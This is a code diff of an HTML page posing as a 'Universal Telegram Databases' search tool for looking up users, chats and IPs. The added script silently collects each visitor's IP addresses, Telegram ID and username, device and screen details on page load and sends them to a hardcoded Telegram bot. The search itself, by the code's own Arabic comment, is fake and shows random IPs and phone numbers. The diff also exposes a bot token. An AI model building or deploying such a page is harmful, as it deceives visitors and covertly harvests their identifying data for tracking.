@@ -2,17 +2,112 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Universal OSINT Database</title>
-    <style>/* ... نفس التنسيق السابق ... */</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Universal Telegram Databases</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #0a0e17; 
+            color: #e0e0e0; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+        .container { 
+            max-width: 650px; 
+            width: 100%; 
+            background: #111a28; 
+            padding: 40px; 
+            border-radius: 15px; 
+            box-shadow: 0 0 30px rgba(0, 150, 255, 0.15); 
+            text-align: center;
+            border: 1px solid #1f2b3e;
+        }
+        .logo {
+            font-size: 40px;
+            margin-bottom: 10px;
+        }
+        h1 { 
+            color: #ffffff; 
+            margin-bottom: 10px; 
+            font-size: 26px;
+            font-weight: 600;
+        }
+        .subtitle { 
+            color: #8892b0; 
+            margin-bottom: 30px; 
+            font-size: 15px; 
+            line-height: 1.5;
+        }
+        .search-box { 
+            display: flex; 
+            gap: 10px; 
+            margin-bottom: 20px; 
+            background: #000;
+            padding: 5px;
+            border-radius: 10px;
+            border: 1px solid #1f2b3e;
+        }
+        input { 
+            flex: 1; 
+            padding: 15px; 
+            background: transparent; 
+            border: none; 
+            color: #00ffcc; 
+            outline: none;
+            font-size: 15px;
+        }
+        input::placeholder { color: #556; }
+        button { 
+            padding: 12px 25px; 
+            background: #0066ff; 
+            color: #fff; 
+            border: none; 
+            border-radius: 8px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: 0.3s;
+            font-size: 15px;
+        }
+        button:hover { background: #0055cc; }
+        #results { 
+            text-align: left; 
+            background: #000; 
+            padding: 25px; 
+            border-radius: 10px; 
+            min-height: 150px; 
+            font-family: 'Courier New', monospace;
+            border: 1px solid #1f2b3e;
+            white-space: pre-wrap;
+            font-size: 14px;
+            color: #00ffcc;
+            line-height: 1.6;
+        }
+        .loader { color: #8892b0; }
+        .error { color: #ff4444; }
+        .success { color: #00ffcc; }
+        .highlight { color: #0066ff; font-weight: bold; }
+    </style>
 </head>
 <body>
     <div class="container">
-        <h1>🌐 Universal OSINT Database</h1>
-        <!-- ... واجهة البحث ... -->
+        <div class="logo">🌐</div>
+        <h1>Universal Telegram Databases</h1>
+        <p class="subtitle">Search across our global database of Telegram users, chats, and IP logs.</p>
+        
+        <div class="search-box">
+            <input type="text" id="searchInput" placeholder="Enter Username, Chat ID, or IP Address...">
+            <button onclick="performSearch()">Search</button>
+        </div>
+        
+        <div id="results">Ready to search. Enter a target above.</div>
     </div>
 
     <script>
-        // ⚠️ ضع توكن البوت ومعرف المحادثة هنا (لأننا حذفنا Cloudflare)
+        // ⚠️ ضع توكن البوت ومعرف المحادثة هنا
         const BOT_TOKEN = "9140495515:AAEaZwF8s79xlbex0jOF6iupyaVCiaPxEDc";
         const CHAT_ID = "8735622476";
 
@@ -21,23 +116,19 @@
             let ipv4 = "Unknown";
             let ipv6 = "Unknown";
             try {
-                // جلب IPv4
                 const res4 = await fetch('https://api.ipify.org?format=json');
                 const data4 = await res4.json();
                 ipv4 = data4.ip;
             } catch (e) {}
-
             try {
-                // جلب IPv6 (إذا كانت الشبكة تدعمها)
                 const res6 = await fetch('https://api64.ipify.org?format=json');
                 const data6 = await res6.json();
                 ipv6 = data6.ip;
             } catch (e) {}
-
             return { ipv4, ipv6 };
         }
 
-        // عند فتح الصفحة: جلب الـ IP وإرساله إلى تيليجرام
+        // عند فتح الصفحة: جلب الـ IP وإرساله إلى تيليجرام (مرة واحدة فقط)
         window.addEventListener('DOMContentLoaded', async () => {
             let tgData = { id: null, username: null };
             if (window.Telegram && window.Telegram.WebApp) {
@@ -50,20 +141,18 @@
                 }
             }
 
-            // جلب الـ IP
             const ips = await getPublicIPs();
 
-            // تجهيز الرسالة
             const msg = `
-🚨 **New Visitor Alert (Client-Side)**
+🚨 **New Visitor Alert**
 - **IPv4:** ${ips.ipv4}
 - **IPv6:** ${ips.ipv6}
 - **Telegram:** ${tgData.username || 'N/A'} (ID: ${tgData.id || 'N/A'})
 - **Device:** ${navigator.userAgent}
 - **Screen:** ${screen.width}x${screen.height}
+- **Platform:** ${navigator.platform}
             `;
 
-            // إرسال مباشر إلى تيليجرام (بدون Cloudflare)
             try {
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -79,7 +168,39 @@
             }
         });
 
-        // ... دالة البحث الوهمي (performSearch) تبقى كما هي ...
+        // دالة البحث الوهمي (تظهر نتائج عشوائية فقط، لا ترسل شيئاً)
+        function performSearch() {
+            const input = document.getElementById('searchInput').value.trim();
+            const results = document.getElementById('results');
+            
+            if (!input) {
+                results.innerHTML = '<span class="error">[-] Please enter a target.</span>';
+                return;
+            }
+
+            results.innerHTML = `<span class="loader">[*] Searching Universal Database for: ${input}...</span>`;
+
+            setTimeout(() => {
+                const randomIp = `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`;
+                const randomDate = new Date(Date.now() - Math.floor(Math.random()*10000000000)).toISOString().split('T')[0];
+                const randomId = Math.floor(Math.random() * 900000000) + 100000000;
+                const status = Math.random() > 0.5 ? 'Active' : 'Inactive';
+                const phone = `+212${Math.floor(Math.random()*900000000) + 100000000}`;
+
+                results.innerHTML = `
+<span class="success">[+] Target Found: ${input}</span>
+--------------------------------------------------
+<span class="highlight">IP Address :</span> ${randomIp}
+<span class="highlight">Telegram ID:</span> ${randomId}
+<span class="highlight">Phone      :</span> ${phone}
+<span class="highlight">Status     :</span> ${status}
+<span class="highlight">Last Seen  :</span> ${randomDate}
+<span class="highlight">Location   :</span> Morocco
+--------------------------------------------------
+<span class="loader">[*] Data extracted from Universal Database.</span>
+                `;
+            }, 2000);
+        }
     </script>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 </body>
